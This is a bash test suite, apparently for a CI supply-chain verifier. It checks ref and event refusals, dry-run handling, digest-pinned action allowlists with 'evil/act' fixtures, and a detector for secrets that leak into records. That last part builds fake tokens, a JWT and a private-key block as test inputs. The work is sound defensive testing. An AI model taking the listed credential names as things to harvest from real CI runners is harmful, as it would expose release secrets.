GITHUB_REF=refs/tags/x GITHUB_EVENT_NAME=workflow_dispatch expect_refuse "001-AC2 a workflow_dispatch on a tag that is not vX.Y.Z is refused (dry run is for branches)" "tag" $(TPR build_coll dispx)
for ev in schedule pull_request pull_request_target repository_dispatch; do
  GITHUB_REF=refs/heads/x GITHUB_EVENT_NAME=$ev expect_refuse "001-AC2 event $ev on a branch is neither production nor a dry run: refused, no record" "tag" $(TPR build_coll evb-$ev)
  GITHUB_REF=refs/pull/1/merge GITHUB_EVENT_NAME=$ev expect_refuse "001-AC2 event $ev on refs/pull/1/merge is refused" "tag" $(TPR build_coll evp-$ev)
done
GITHUB_REF=refs/pull/1/merge GITHUB_EVENT_NAME=workflow_dispatch expect_refuse "001-AC2 workflow_dispatch on refs/pull/1/merge (not a branch) is refused" "tag" $(TPR build_coll evpd)
GITHUB_REF= GITHUB_EVENT_NAME=workflow_dispatch expect_refuse "001-AC2 workflow_dispatch with an EMPTY ref is refused" "tag" $(TPR build_coll evempty)
GITHUB_REF=main GITHUB_EVENT_NAME=workflow_dispatch expect_refuse "001-AC2 workflow_dispatch with a ref that is not fully qualified (main) is refused" "tag" $(TPR build_coll evbare)
GITHUB_REF=refs/heads/x GITHUB_EVENT_NAME= expect_refuse "001-AC2 an empty event name on a branch is refused" "tag" $(TPR build_coll evnone)
GITHUB_REF=refs/heads/hostile-proof/x GITHUB_EVENT_NAME=workflow_dispatch expect_ok "001-AC2 DRY RUN: workflow_dispatch on a branch makes the policy for that ref and signs" $(TPR build_coll br1)
python3 - "$work/sd/br1" <<'PY' 2> /dev/null && ok "001-AC2 DRY RUN: the provenance says dryRun true and DRY-RUN sits beside it" || bad "001-AC2 DRY RUN: marker or dryRun flag missing"
import base64, json, os, sys
d = sys.argv[1]; assert os.path.exists(os.path.join(d, "DRY-RUN"))
st = json.loads(base64.b64decode(json.load(open(os.path.join(d, "provenance.json")))["payload"]))
assert st["predicate"].get("dryRun") is True, st["predicate"]
PY
GITHUB_REF=refs/tags/v0.3.0 GITHUB_EVENT_NAME=push expect_ok "001-AC2 production: refs/tags/v0.3.0 on a push" $(TPR build_coll tagok)
GITHUB_REF=refs/tags/v0.3.0 GITHUB_EVENT_NAME=workflow_dispatch expect_refuse "001-AC2 step-8 SF-4: a workflow_dispatch on the exact tag is NOT a production run: refused, and cosign is not called" "workflow_dispatch|!digest|!signature" $(TPR build_coll tagdisp)
[ ! -e "$work/sd/tagok/DRY-RUN" ] && [ ! -e "$work/sd/tagdisp/DRY-RUN" ] && ok "001-AC2 production output carries no DRY-RUN marker" || bad "001-AC2 a production sign wrote a DRY-RUN marker"
python3 - "$work/sd/tagok" <<'PY' 2> /dev/null && ok "001-AC2 production provenance has no dryRun flag" || bad "001-AC2 production provenance carries dryRun"
import base64, json, os, sys
st = json.loads(base64.b64decode(json.load(open(os.path.join(sys.argv[1], "provenance.json")))["payload"]))
assert not st["predicate"].get("dryRun"), st["predicate"]
PY
rc=0; run policy make --template "$work/template.json" --ref refs/heads/hostile-proof/x --out "$work/policy-br.json" || rc=$?
[ "$rc" = 0 ] && python3 -c 'import json,sys; p=json.load(open(sys.argv[1])); sys.exit(0 if p.get("dry_run") is True and p["ref"]=="refs/heads/hostile-proof/x" and p["tag"]=="" else 1)' "$work/policy-br.json" && ok "002-AC2 policy make --ref <branch> makes a dry_run policy for that ref and no tag" || bad "002-AC2 policy make --ref <branch> (exit $rc)"
for r in refs/tags/x refs/pull/1/merge; do
  expect_refuse "002-AC2 policy make --ref $r is refused" "tag" policy make --template "$work/template.json" --ref "$r" --out "$work/policy-bad.json"
done
rc=0; run policy make --template "$work/template.json" --ref refs/tags/v0.3.0 --out "$work/policy-reftag.json" || rc=$?
[ "$rc" = 0 ] && cmp -s "$work/policy.json" "$work/policy-reftag.json" && ok "002-AC2 policy make --ref refs/tags/v0.3.0 is the same policy as --tag v0.3.0" || bad "002-AC2 --ref on the exact tag differs from --tag (exit $rc)"
expect_ok     "002-AC2 the dry-run policy accepts Sign's record at the dry-run ref (the positive control passes)" verify --policy "$work/policy-br.json" --stage sign $(rec sign_br)
expect_refuse "002-AC2 RELEASE'S TAG-PINNED POLICY REFUSES a Sign record whose SAN ref is a branch: a dry run can never be accepted" "refs/heads/hostile-proof/x" verify $(V) --stage sign $(rec sign_br)
expect_refuse "002-AC2 round 5 B2a: a BRANCH named like the tag (refs/heads/v0.3.0) is refused by the tag policy (the ref is compared whole, not by its last segment)" "refs/heads/v0.3.0" verify $(V) --stage sign $(rec sign_brtag)
expect_refuse "002-AC2 round 5 B2a: refs/heads/release/v0.3.0 is refused" "refs/heads/release/v0.3.0" verify $(V) --stage sign $(rec sign_brrel)
expect_refuse "Q2b 002-AC2 round 5 B2a: the run's ref is the tag but the calling workflow's ref is the BRANCH refs/heads/v0.3.0: refused" "workflow|refs/heads/v0.3.0" verify $(V) --stage sign $(rec sign_cfg_brtag)
expect_refuse "Q2b a provenance with no calling workflow is refused (the field the policy compares must be there)" "workflow" verify $(V) --stage sign $(rec sign_nowf)
expect_refuse "Q3 a provenance with no externalParameters.ref is refused (with no certificate the ref is what ties it to the tag)" "ref" verify $(V) --stage sign $(rec sign_noref)
# the committed key manifest does not exist until the owner makes the offline root key: that absence is ONE fail-closed case, not a failure of every case that makes a policy
expect_refuse "P1 with the committed policy directory (no release-key-root.pub yet) policy make fails closed at the manifest" "manifest|release-key-root.pub" policy make --template "$root/.github/policy/release-policy.template.json" --tag v0.3.0 --out "$work/policy-committed.json"
# the building jobs' local records (*.local.json, the throwaway-key form) are never read as a record, and must not sit beside a trusted one
mkdir -p "$work/ldir" "$work/ldir2"
cp "$work/build_coll.json" "$work/ldir/build-collection.json"; cp "$work/build_coll.json" "$work/ldir/apk-collection.local.json"
cp "$work/build_coll.json" "$work/ldir2/x.local.json"
expect_refuse "WM a directory handed to a verifier that holds a *.local.json is refused (an unsigned local record must never sit beside a trusted one)" "local.json" verify $(V) --stage build --record "$work/ldir/build-collection.json"
expect_refuse "WM a record that is itself named *.local.json is refused, signed or not" "local.json" verify $(V) --stage build --record "$work/ldir2/x.local.json"
expect_refuse "WM stage-start refuses a directory with a *.local.json too" "local.json" $(ST rebuild build) --record "$work/ldir/build-collection.json" --digests "$work/digests.json"
rm -rf "$work/ldir" "$work/ldir2"
expect_refuse "002-AC2 round 5 B2b: a Sign record whose predicate says dryRun true is refused under the TAG policy even though its SAN ref is the tag" "dry" verify $(V) --stage sign $(rec sign_flag_tag)
expect_refuse "003-AC1 round 5 B2b: release <- sign with a dryRun-true record at the tag is refused: names sign and dry" "sign|dry" $(ST release sign) $(rec sign_flag_tag) --digests "$work/digests.json"
expect_refuse "003-AC1 round 5 B2b: stage-start refuses a dry_run POLICY (release <- sign, a dry record): names dry" "dry" stage-start --stage release --previous sign --policy "$work/policy-br.json" $(rec sign_br) --digests "$work/digests.json"
expect_refuse "003-AC1 round 5 B2b: stage-start refuses a dry_run policy for every stage (rebuild <- build)" "dry" stage-start --stage rebuild --previous build --policy "$work/policy-br.json" $(rec build_coll) --digests "$work/digests.json"
expect_refuse "002-AC2 round 5 B2b: verify with a dry_run policy is for stage sign ONLY (stage build is refused)" "dry" verify --policy "$work/policy-br.json" --stage build $(rec build_coll)
expect_refuse "002-AC2 round 5 B2b: verify with a dry_run policy is for stage sign ONLY (stage release is refused)" "dry" verify --policy "$work/policy-br.json" --stage release $(rec release_policy)
expect_refuse "003-AC1 release <- sign with a dry-run record is refused: names sign and the branch ref" "sign|refs/heads/hostile-proof/x" $(ST release sign) $(rec sign_br) --digests "$work/digests.json"
DSC() { echo sign --check --signer cosign --build-record "$work/$1.json" --policy "$work/policy-br.json" --digests "$work/$2.json" --out "$work/sd/$3"; }
GITHUB_REF=refs/heads/hostile-proof/x GITHUB_EVENT_NAME=workflow_dispatch expect_refuse "001-AC5 sign --check --policy <dry policy>: digests Build did not attest are refused 'digest', not 'dry'" "digest|!dry" $(DSC build_coll digests-other dsc1)
GITHUB_REF=refs/heads/hostile-proof/x GITHUB_EVENT_NAME=workflow_dispatch expect_refuse "001-AC5 sign --check --policy <dry policy>: malformed digests Build attested are refused 'format', not 'dry'" "format|!dry" $(DSC build_coll_badval digests-badval dsc2)
GITHUB_REF=refs/heads/hostile-proof/x GITHUB_EVENT_NAME=workflow_dispatch expect_ok "001-AC5 sign --check --policy <dry policy>: valid digests Build attested are accepted (so the two refusals above are about the digests)" $(DSC build_coll digests dsc3)
GITHUB_REF=refs/tags/v0.3.0 GITHUB_EVENT_NAME=push expect_ok "001-AC2 sign --check with no --now (the Sign job passes none) uses the current time" sign --check --signer cosign --build-record "$work/build_coll.json" --template "$work/template.json" --digests "$work/digests.json" --out "$work/sd/nonow"

# ---- REQ-CHAIN-003-AC1: each stage verifies the one before it, with the cause named ------------------------------------
expect_ok     "003-AC1 rebuild <- build: a valid record about exactly the given digests lets the stage start" $(ST rebuild build) $(rec build_coll) --digests "$work/digests.json"
expect_ok     "003-AC1 check <- build: the same for Check" $(ST check build) $(rec build_coll) --digests "$work/digests.json"
expect_ok     "003-AC1 release <- sign: provenance with its Rekor entry lets Release start" $(ST release sign) $(rec sign_prov) --digests "$work/digests.json"
expect_refuse "003-AC1 release <- sign with a SUPERSET of the provenance's subjects is refused" "sign|digest" $(ST release sign) $(rec sign_prov) --digests "$work/digests-extra.json"
expect_refuse "003-AC1 release <- sign with a SUBSET of the provenance's subjects is refused" "sign|digest" $(ST release sign) $(rec sign_prov) --digests "$work/digests-subset.json"
expect_ok     "003-AC1 release <- rebuild" $(ST release rebuild) $(rec rebuild_coll) --digests "$work/digests.json"
expect_ok     "003-AC1 release <- check" $(ST release check) $(rec check_coll) --digests "$work/digests.json"
expect_refuse "003-AC1 other digests: names build and the digest cause" "build|digest" $(ST rebuild build) $(rec build_coll) --digests "$work/digests-other.json"
expect_refuse "003-AC1 a SUBSET of the record's digests is refused" "build|digest" $(ST rebuild build) $(rec build_coll) --digests "$work/digests-subset.json"
expect_refuse "003-AC1 a SUPERSET of the record's digests is refused" "build|digest" $(ST rebuild build) $(rec build_coll) --digests "$work/digests-extra.json"
expect_refuse "003-AC1 a record with more subjects than the given list is refused" "build|digest" $(ST rebuild build) $(rec build_coll_plus) --digests "$work/digests.json"
expect_refuse "003-AC1 an unsigned record: names build and signature" "build|signature" $(ST rebuild build) $(rec build_coll_unsigned) --digests "$work/digests.json"
expect_refuse "003-AC1 tamper through stage-start: payload changed after signing" "build|signature" $(ST rebuild build) $(rec build_coll_tampered) --digests "$work/digests.json"
expect_refuse "003-AC1 no record: names build and missing" "build|missing" $(ST rebuild build) --record "$work/does-not-exist.json" --digests "$work/digests.json"
expect_refuse "003-AC1 replay: release <- sign with the provenance of OLD digests is refused as a digest mismatch" "sign|digest" $(ST release sign) $(rec sign_otherdigests) --digests "$work/digests.json"
expect_refuse "003-AC1 release <- check with other digests" "check|digest" $(ST release check) $(rec check_coll) --digests "$work/digests-other.json"
expect_refuse "003-AC1 release <- rebuild whose digests differ from Build's: names rebuild" "rebuild|digest" $(ST release rebuild) $(rec rebuild_coll_other) --digests "$work/digests.json"

# ---- REQ-CHAIN-003-AC4: every action reference is a listed full digest -------------------------------------------------
a40=$(printf 'a%.0s' $(seq 40)); b40=$(printf 'b%.0s' $(seq 40)); i64=$(printf '1%.0s' $(seq 64)); j64=$(printf '2%.0s' $(seq 64))
cat > "$work/allowed.json" <<EOF
{"actions":["actions/checkout@$a40","actions/cache/restore@$a40","fosterstack/cache/.github/workflows/lib.yml@$b40"],"images":["ghcr.io/fosterstack/runner@sha256:$i64","postgres@sha256:$i64"],"local":[".github/workflows/stage-sign.yml"]}
EOF
echo '{"actions":[],"images":[],"local":[]}' > "$work/allowed-empty.json"
w() { printf 'name: t\non: workflow_call\njobs:\n%b' "$2" > "$work/$1.yml"; }
w w_good    "  j:\n    runs-on: ubuntu-24.04\n    container: ghcr.io/fosterstack/runner@sha256:$i64\n    services:\n      db:\n        image: postgres@sha256:$i64\n    steps:\n      - uses: actions/checkout@$a40 # v7.0.1\n      - uses: actions/cache/restore@$a40\n"
w w_unl     "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/upload-artifact@$a40 # v7\n"
w w_tag     "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@v4\n"
w w_branch  "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@main\n"
w w_otherd  "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@$b40\n"
w w_short   "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@aaaaaaa\n"
w w_upper   "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@$(printf 'A%.0s' $(seq 40))\n"
w w_sub     "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/cache/save@$a40\n"
w w_expr    "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@\${{ inputs.ref }}\n"
w w_exprname "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: \${{ inputs.action }}@$a40\n"
w w_jobreuse "  j:\n    uses: fosterstack/cache/.github/workflows/other.yml@$b40\n"
w w_jobreuseok "  j:\n    uses: fosterstack/cache/.github/workflows/lib.yml@$b40\n"
w w_jobreusemain "  j:\n    uses: fosterstack/cache/.github/workflows/lib.yml@main\n"
w w_cont    "  j:\n    runs-on: ubuntu-24.04\n    container: ghcr.io/fosterstack/runner:latest\n    steps:\n      - run: true\n"
w w_contmap "  j:\n    runs-on: ubuntu-24.04\n    container:\n      image: ghcr.io/fosterstack/runner:latest\n    steps:\n      - run: true\n"
w w_contmapok "  j:\n    runs-on: ubuntu-24.04\n    container:\n      image: ghcr.io/fosterstack/runner@sha256:$i64\n    steps:\n      - run: true\n"
w w_contd   "  j:\n    runs-on: ubuntu-24.04\n    container: ghcr.io/fosterstack/runner@sha256:$j64\n    steps:\n      - run: true\n"
w w_svc     "  j:\n    runs-on: ubuntu-24.04\n    services:\n      db:\n        image: postgres:latest\n    steps:\n      - run: true\n"
w w_svcd    "  j:\n    runs-on: ubuntu-24.04\n    services:\n      db:\n        image: postgres@sha256:$j64\n    steps:\n      - run: true\n"
w w_docker  "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: docker://alpine:3.20\n"
w w_dockerd "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: docker://postgres@sha256:$i64\n"
w w_dockerun "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: docker://alpine@sha256:$j64\n"
w w_local   "  j:\n    uses: ./.github/workflows/stage-sign.yml\n"
w w_localbad "  j:\n    uses: ./.github/workflows/stage-build.yml\n"
w w_localstep "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ./.github/actions/thing\n"
cat > "$work/action-good.yml" <<EOF
name: composite
runs:
  using: composite
  steps:
    - uses: actions/checkout@$a40
    - run: true
      shell: bash
EOF
sed "s/actions\/checkout@$a40/actions\/checkout@v4/" "$work/action-good.yml" > "$work/action-tag.yml"
w w_contexpr "  j:\n    runs-on: ubuntu-24.04\n    container: \${{ inputs.image }}\n    steps:\n      - run: true\n"
w w_svcexpr  "  j:\n    runs-on: ubuntu-24.04\n    services:\n      db:\n        image: \${{ inputs.db }}\n    steps:\n      - run: true\n"
w w_localcomp "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ./.github/actions/thing\n"
mkdir -p "$work/tree/.github/actions/thing" "$work/tree/.github/actions/clean"
printf 'name: thing\nruns:\n  using: composite\n  steps:\n    - uses: actions/setup-node@v4\n    - run: true\n      shell: bash\n' > "$work/tree/.github/actions/thing/action.yml"
printf 'name: clean\nruns:\n  using: composite\n  steps:\n    - uses: actions/checkout@%s\n' "$a40" > "$work/tree/.github/actions/clean/action.yml"
echo '{"actions":["actions/checkout@'$a40'"],"images":[],"local":[".github/actions/thing",".github/actions/clean"]}' > "$work/allowed-local.json"
w w_dig63   "  j:\n    runs-on: ubuntu-24.04\n    container: ghcr.io/fosterstack/runner@sha256:$(printf '1%.0s' $(seq 63))\n    steps:\n      - run: true\n"
w w_digup   "  j:\n    runs-on: ubuntu-24.04\n    container: ghcr.io/fosterstack/runner@sha256:$(printf 'A%.0s' $(seq 64))\n    steps:\n      - run: true\n"
w w_tagdig  "  j:\n    runs-on: ubuntu-24.04\n    services:\n      db:\n        image: postgres:16@sha256:$i64\n    steps:\n      - run: true\n"
printf 'name: dockeraction\nruns:\n  using: docker\n  image: docker://alpine:3.20\n' > "$work/action-docker.yml"
printf 'name: dockeraction2\nruns:\n  using: docker\n  image: Dockerfile\n' > "$work/action-dockerfile.yml"
A() { echo actions "$work/$1.yml" --allowed "$work/${2:-allowed}.json"; }
expect_ok     "003-AC4 a file whose references (steps, container, services) are all listed digests is accepted" $(A w_good)
expect_ok     "003-AC4 a job-level reusable call listed by digest is accepted" $(A w_jobreuseok)
expect_ok     "003-AC4 a container mapping form listed by digest is accepted" $(A w_contmapok)
expect_ok     "003-AC4 a docker:// reference listed by digest is accepted" $(A w_dockerd)
expect_ok     "003-AC4 a local reusable call named by path in the list is accepted" $(A w_local)
expect_ok     "003-AC4 a composite action.yml whose steps are all listed is accepted" $(A action-good)
for c in w_unl:upload-artifact w_tag:checkout@v4 w_branch:checkout@main w_otherd:checkout w_short:aaaaaaa w_upper:checkout w_sub:cache/save \
         w_expr:inputs.ref w_exprname:inputs.action w_jobreuse:other.yml w_jobreusemain:lib.yml@main w_cont:runner:latest w_contmap:runner:latest \
         w_dig63:runner@sha256 w_digup:runner@sha256 w_tagdig:postgres:16 action-docker:alpine action-dockerfile:dockerfile w_contd:runner w_svc:postgres:latest w_svcd:postgres w_docker:alpine w_dockerun:alpine w_localbad:stage-build.yml w_localstep:thing action-tag:checkout@v4; do
  expect_refuse "003-AC4 ${c%%:*} is rejected and named" "${c#*:}" $(A "${c%%:*}")
done
expect_refuse "003-AC4 a container given as an expression is rejected" "inputs.image" $(A w_contexpr)
expect_refuse "003-AC4 a services image given as an expression is rejected" "inputs.db" $(A w_svcexpr)
expect_refuse "003-AC4 a listed local composite action is followed: the unlisted action inside it is rejected and named" "setup-node" actions "$work/w_localcomp.yml" --allowed "$work/allowed-local.json" --root "$work/tree"
printf 'name: t\non: workflow_call\njobs:\n  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ./.github/actions/clean\n' > "$work/w_localclean.yml"
expect_ok     "003-AC4 a listed local composite action whose own steps are all listed is accepted" actions "$work/w_localclean.yml" --allowed "$work/allowed-local.json" --root "$work/tree"
expect_refuse "003-AC4 an empty allowed list rejects even the good file" "checkout" $(A w_good allowed-empty)
python3 - "$root" 2> /dev/null <<'PY' && ok "003-AC4 .github/policy/allowed-actions.json exists, non-empty, digest-only" || bad "003-AC4 committed allowed-actions.json missing, empty or not digest-only"
import json, re, sys
a = json.load(open(sys.argv[1] + "/.github/policy/allowed-actions.json"))
assert len(a["actions"]) > 0, "no actions listed"
assert all(re.fullmatch(r"[^@\s]+@[0-9a-f]{40}", x) for x in a["actions"]), a["actions"]
assert all(re.fullmatch(r"[^@\s]+@sha256:[0-9a-f]{64}", x) for x in a["images"]), a["images"]
PY

# N-1: strict records
expect_refuse "N-1 a record with a repeated JSON key is refused" "envelope|duplicate" verify $(V) --stage sign $(rec sign_dupkey)
expect_refuse "N-1 a record with two signatures is refused: exactly one is judged" "exactly one signature" verify $(V) --stage sign $(rec sign_2sig)
# N-2: a stage starts only from the records it may start from
expect_refuse "N-2 sign cannot start from rebuild's record" "stage" $(ST sign rebuild) $(rec rebuild_coll) --digests "$work/digests.json"
expect_refuse "N-2 rebuild cannot start from sign's record" "stage" $(ST rebuild sign) $(rec sign_prov) --digests "$work/digests.json"
expect_refuse "N-2 check cannot start from check's own record" "stage" $(ST check check) $(rec check_coll) --digests "$work/digests.json"
expect_refuse "N-2 nothing starts from the release policy (release is nobody's predecessor)" "stage" $(ST release release) $(rec release_policy) --digests "$work/digests.json"
expect_ok     "N-2 control: rebuild <- build, check <- build and sign <- build are the pairs" $(ST rebuild build) $(rec build_coll) --digests "$work/digests.json"
# Sonnet SF3: a malformed statement is a refusal with a name, not a traceback
expect_refuse "SF3 a collection whose subject list holds non-subjects is refused with a 'refused at' line" "subjects|malformed" $(ST rebuild build) $(rec build_badsubj) --digests "$work/digests.json"
# check-build-record: Sign's check without the signature, no cosign in sight
rc=0; run check-build-record --digests "$work/digests.json" --build-record "$work/build_coll.json" --policy "$work/policy.json" || rc=$?
if [ "$rc" = 0 ] && [ ! -s "$work/cosign-argv.log" ]; then ok "check-build-record accepts Build's genuine record and the attested digests and calls no tool"; else bad "check-build-record on a genuine record (exit $rc)"; fi
expect_refuse "check-build-record refuses a digest list Build did not attest: names digest" "digest" check-build-record --digests "$work/digests-other.json" --build-record "$work/build_coll.json" --policy "$work/policy.json"
expect_refuse "check-build-record refuses attested digests of the wrong format: names format" "format" check-build-record --digests "$work/digests-upper.json" --build-record "$work/build_coll_upper.json" --policy "$work/policy.json"
expect_refuse "check-build-record refuses a tampered Build record: names the signature" "signature" check-build-record --digests "$work/digests.json" --build-record "$work/build_coll_tampered.json" --policy "$work/policy.json"
# SF-1: the follower reads every listed local action, whatever its file name or place
mkdir -p "$work/tree/.github/actions/yaml" "$work/tree/tools/y"
printf 'name: y\nruns:\n  using: composite\n  steps:\n    - uses: evil/act@main\n' > "$work/tree/.github/actions/yaml/action.yaml"
printf 'name: y\nruns:\n  using: composite\n  steps:\n    - uses: evil/act@main\n' > "$work/tree/tools/y/action.yml"
echo '{"actions":["actions/checkout@'$a40'"],"images":[],"local":[".github/actions/yaml","tools/y",".github/actions/none"]}' > "$work/allowed-sf1.json"
w w_sf1yaml "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ./.github/actions/yaml\n"
w w_sf1tools "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ./tools/y\n"
w w_sf1none "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ./.github/actions/none\n"
expect_refuse "SF-1 a listed local action in an action.yaml file is followed: the unpinned action inside it is rejected" "evil/act" actions "$work/w_sf1yaml.yml" --allowed "$work/allowed-sf1.json" --root "$work/tree"
expect_refuse "SF-1 a listed local action outside .github/actions is followed too" "evil/act" actions "$work/w_sf1tools.yml" --allowed "$work/allowed-sf1.json" --root "$work/tree"
expect_refuse "SF-1 a listed local action with no action.yml or action.yaml under --root is refused" "none" actions "$work/w_sf1none.yml" --allowed "$work/allowed-sf1.json" --root "$work/tree"
expect_refuse "SF-1 a listed local action without --root cannot be read, so it is refused" "root" actions "$work/w_sf1yaml.yml" --allowed "$work/allowed-sf1.json"
# ---- the Witness move (owner Oct 22) under one key: Build's, Rebuild's and Check's records are bound to their stage by type and collection name
expect_ok     "WM a Build record signed by the release key is accepted" verify $(V) --stage build $(rec build_coll)
expect_ok     "WM a Rebuild record signed by the release key is accepted" verify $(V) --stage rebuild $(rec rebuild_coll)
expect_ok     "WM a Check record (collection scanners) signed by the release key is accepted" verify $(V) --stage check $(rec check_coll)
expect_refuse "WM a Build record (collection build) presented as Check's is refused by its collection name, whoever signed it" "collection name" verify $(V) --stage check $(rec build_coll)
expect_refuse "WM a Rebuild record (collection rebuild) presented as Check's is refused by its collection name" "collection name" verify $(V) --stage check $(rec rebuild_coll)

expect_refuse "N-8 a record written in UTF-16 is refused" "envelope" verify $(V) --stage build --record "$work/build_coll_u16.json"
expect_refuse "N-8 a digest file in UTF-16 is refused by stage-start" "digest" $(ST release check) $(rec check_coll) --digests "$work/digests-u16.json"
expect_refuse "N-8 a digest file in UTF-16 is refused by check-build-record" "digest" check-build-record --digests "$work/digests-u16.json" --build-record "$work/build_coll.json" --policy "$work/policy.json"
iconv -f UTF-8 -t UTF-16 "$work/policy.json" > "$work/policy-u16.json"
expect_refuse "N-8 a policy file in UTF-16 is refused" "policy" verify --policy "$work/policy-u16.json" --stage build $(rec build_coll)
# N-7: --template (the committed template, the policy is made here) and --policy (a finished policy) are two inputs, exactly one is given
expect_refuse "N-7 a template given as --policy is refused: it is not a finished policy" "template|policy" check-build-record --digests "$work/digests.json" --build-record "$work/build_coll.json" --policy "$work/template.json"
rc=0; run check-build-record --digests "$work/digests.json" --build-record "$work/build_coll.json" --template "$work/template.json" --policy "$work/policy.json" || rc=$?
if [ "$rc" = 2 ]; then ok "N-7 --template and --policy together are a usage error (exactly one)"; else bad "N-7 --template with --policy must exit 2, got $rc"; fi
rc=0; run check-build-record --digests "$work/digests.json" --build-record "$work/build_coll.json" --now "$NOW" || rc=$?
if [ "$rc" = 2 ]; then ok "N-7 neither --template nor --policy is a usage error"; else bad "N-7 neither flag must exit 2, got $rc"; fi
# S-1: a composite action may be stored under .github/workflows/; only a reference that names a .yml/.yaml FILE (a reusable workflow) is judged as a workflow
mkdir -p "$work/tree/.github/workflows/acts/thing" "$work/tree/.github/workflows/acts/ok"
printf 'name: t\nruns:\n  using: composite\n  steps:\n    - uses: evil/act@main\n' > "$work/tree/.github/workflows/acts/thing/action.yml"
printf 'name: t\nruns:\n  using: composite\n  steps:\n    - uses: actions/checkout@%s\n' "$a40" > "$work/tree/.github/workflows/acts/ok/action.yml"
echo '{"actions":["actions/checkout@'$a40'"],"images":[],"local":[".github/workflows/acts/thing",".github/workflows/acts/ok",".github/workflows/lib.yml"]}' > "$work/allowed-s1.json"
w w_s1bad "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ./.github/workflows/acts/thing\n"
w w_s1ok "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ./.github/workflows/acts/ok\n"
printf 'name: t\non: workflow_call\njobs:\n  j:\n    uses: ./.github/workflows/lib.yml\n' > "$work/w_s1wf.yml"
expect_refuse "S-1 a composite action stored under .github/workflows/ is followed: the unpinned action inside it is rejected" "evil/act" actions "$work/w_s1bad.yml" --allowed "$work/allowed-s1.json" --root "$work/tree"
expect_ok     "S-1 control: a pinned composite action under .github/workflows/ is accepted" actions "$work/w_s1ok.yml" --allowed "$work/allowed-s1.json" --root "$work/tree"
expect_ok     "S-1 control: a listed reusable workflow file (.yml) is not opened as an action directory" actions "$work/w_s1wf.yml" --allowed "$work/allowed-s1.json" --root "$work/tree"
# rc-2 R4 (REQ-CHAIN-007-AC12): the command the Release job runs on each of its six Witness records (python3 -I bin/chain-verify.py record-env --record FILE) accepts a record that carries no token and refuses a record that names or holds one; the record is a DSSE envelope as Witness wrote it, the payload base64
python3 - "$work" <<'PYE'
import base64, json, sys
w = sys.argv[1]
r = json.load(open(w + "/build_coll.json"))
st = json.loads(base64.b64decode(r["payload"]))
def leak(name, extra):
    q = json.loads(json.dumps(st)); q.setdefault("predicate", {})["leak"] = extra
    e = dict(r); e["payload"] = base64.b64encode(json.dumps(q).encode()).decode(); json.dump(e, open("%s/renv_%s.json" % (w, name), "w"))
leak("gh", {"GH_TOKEN": "x"})
leak("idt", {"ACTIONS_ID_TOKEN_REQUEST_URL": "https://token.invalid/x"})
leak("jwt", "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ4eHh4eHh4In0.c2lnbmF0dXJlLXh4eA")
leak("pat", "github_pat_" + "A" * 30)
leak("dhu", {"DOCKERHUB_USERNAME": "x"})
leak("dht", {"DOCKERHUB_TOKEN": "x"})
leak("apk", {"APK_RELEASE_SIGNING_KEY": "x"})
leak("rt", {"ACTIONS_RUNTIME_FOO": "x"})
leak("pem", "-----BEGIN " + "PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC\n-----END " + "PRIVATE KEY-----\n")      # assembled here, so no tracked file holds a private-key block (persona-uat-test: a private key never touches the tree)
leak("dckr", "dckr_pat_" + "B" * 30)
PYE
expect_ok     "R4 record-env accepts a Witness record that carries no token" record-env --record "$work/build_coll.json"
expect_refuse "R4 record-env refuses a Witness record that names GH_TOKEN (inside the base64 payload)" "env|gh_token" record-env --record "$work/renv_gh.json"
expect_refuse "R4 record-env refuses a Witness record that names an ACTIONS_ID_TOKEN_REQUEST variable" "env|actions_id_token_request" record-env --record "$work/renv_idt.json"
expect_refuse "R4 record-env refuses a Witness record that holds a compact JWT" "env|jwt" record-env --record "$work/renv_jwt.json"
expect_refuse "R4 record-env refuses a Witness record that holds a github_pat_ token value" "env|token" record-env --record "$work/renv_pat.json"
expect_refuse "R4 record-env refuses a Witness record that names DOCKERHUB_USERNAME" "env|dockerhub_username" record-env --record "$work/renv_dhu.json"
expect_refuse "R4 record-env refuses a Witness record that names DOCKERHUB_TOKEN" "env|dockerhub_token" record-env --record "$work/renv_dht.json"
expect_refuse "R4 record-env refuses a Witness record that names APK_RELEASE_SIGNING_KEY" "env|apk_release_signing_key" record-env --record "$work/renv_apk.json"
expect_refuse "R4 record-env refuses any ACTIONS_RUNTIME_ variable (a prefix, not two names)" "env|actions_runtime_foo" record-env --record "$work/renv_rt.json"
expect_refuse "R4 record-env refuses a Witness record that holds a private key block" "env|private key" record-env --record "$work/renv_pem.json"
expect_refuse "R4 record-env refuses a Witness record that holds a Docker Hub token value" "env|docker hub token" record-env --record "$work/renv_dckr.json"
# N-c: only a JOB-level `uses:` naming a .yml/.yaml file is a reusable workflow (not opened as a directory); a STEP-level reference to a
# directory that is called thing.yml and holds an action.yml is followed
mkdir -p "$work/tree/.github/workflows/acts/d.yml"
printf 'name: t\nruns:\n  using: composite\n  steps:\n    - uses: evil/act@main\n' > "$work/tree/.github/workflows/acts/d.yml/action.yml"
echo '{"actions":["actions/checkout@'$a40'"],"images":[],"local":[".github/workflows/acts/d.yml"]}' > "$work/allowed-nc.json"
